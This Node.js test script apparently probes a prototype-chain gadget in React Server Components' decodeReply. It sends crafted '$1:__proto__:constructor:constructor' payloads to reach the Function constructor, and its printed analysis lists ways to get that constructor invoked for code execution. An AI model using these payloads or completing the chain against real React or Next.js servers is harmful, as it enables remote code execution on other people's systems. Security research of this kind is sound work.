/**
 * Test: Can we get Function.bind with controlled arguments via __proto__?
 *
 * The msanft approach gives us Function via:
 *   $1:__proto__:constructor:constructor
 *
 * Can we access Function.bind.apply or Function.prototype?
 */

'use strict';

const webpackServerMap = {};

global.__webpack_chunk_load__ = id => Promise.resolve();
global.__webpack_require__ = id => ({});

process.env.NODE_ENV = 'production';
require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
    version: '19.0.0',
  }
};

const { decodeReply } = require('react-server-dom-webpack/server.node');

console.log('='.repeat(60));
console.log('Test: Exploring prototype chain access');
console.log('='.repeat(60));
console.log('');

async function test(name, payload0, payload1) {
  console.log(`[TEST] ${name}`);
  const formData = new Map();
  formData.set('0', payload0);
  if (payload1) formData.set('1', payload1);
  formData.forEach = function(cb) { for (const [k, v] of this.entries()) cb(v, k); };

  try {
    const result = await decodeReply(formData, webpackServerMap);
    console.log('  Result:', result);
    console.log('  Type:', typeof result);
    if (Array.isArray(result) && result[0]) {
      console.log('  result[0]:', result[0]);
      console.log('  result[0] type:', typeof result[0]);
      console.log('  result[0] === Function?', result[0] === Function);
    }
  } catch (e) {
    console.log('  Error:', e.message);
  }
  console.log('');
}

async function main() {
  // Basic prototype access
  await test('Get Function constructor',
    '["$1:__proto__:constructor:constructor"]',
    '{"x":1}'
  );

  // Access Function.prototype
  await test('Get Function.prototype',
    '["$1:__proto__:constructor:constructor:prototype"]',
    '{"x":1}'
  );

  // Access Function.prototype.bind
  await test('Get Function.prototype.bind',
    '["$1:__proto__:constructor:constructor:prototype:bind"]',
    '{"x":1}'
  );

  // Access Function.prototype.call
  await test('Get Function.prototype.call',
    '["$1:__proto__:constructor:constructor:prototype:call"]',
    '{"x":1}'
  );

  // Access Function.prototype.apply
  await test('Get Function.prototype.apply',
    '["$1:__proto__:constructor:constructor:prototype:apply"]',
    '{"x":1}'
  );

  // Try to get eval
  await test('Try eval via global',
    '["$1:__proto__:constructor:constructor:constructor"]',
    '{"x":1}'
  );

  // What about going through the function's scope?
  // In JavaScript: (function(){}).constructor.constructor === Function
  // But: (function(){}).constructor("return this")() === global

  // Test accessing global via constructor trick
  console.log('[MANUAL TEST] Getting global via Function:');
  const F = Function;
  const getGlobal = F('return this');
  console.log('  F("return this")() global keys:', Object.keys(getGlobal()).slice(0, 10));
  console.log('');

  // Can we chain this?
  // $1:__proto__:constructor:constructor gives Function
  // But we need to CALL it with "return this"
  // The colon syntax only does property access, not invocation

  console.log('[ANALYSIS]');
  console.log('');
  console.log('The colon syntax ($N:key:key) only does property access.');
  console.log('It cannot invoke functions.');
  console.log('');
  console.log('We CAN get Function, but we need something to CALL it.');
  console.log('');
  console.log('Options:');
  console.log('  1. .then() path (V8 calls it, but with resolve/reject)');
  console.log('  2. @@iterator path (React calls it once)');
  console.log('  3. REACT_LAZY_TYPE _init() path (needs $$typeof symbol)');
  console.log('  4. Something else in Next.js that calls returned functions');
  console.log('');
}

main().catch(console.error);
